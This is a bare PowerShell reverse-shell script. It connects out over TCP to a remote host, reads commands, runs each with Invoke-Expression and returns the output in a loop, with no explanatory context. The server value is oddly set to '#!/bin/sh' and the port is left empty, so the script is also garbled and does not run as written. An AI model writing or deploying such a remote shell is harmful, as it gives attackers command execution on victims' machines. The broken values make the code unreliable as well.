$server = '#!/bin/sh'
$port = 

$client = New-Object System.Net.Sockets.TCPClient($server, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {
    try {
        $cmd = $reader.ReadLine()
        if ($cmd -eq 'exit') { break }
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    } catch {
        break
    }
}

$reader.Close()
$writer.Close()
$client.Close()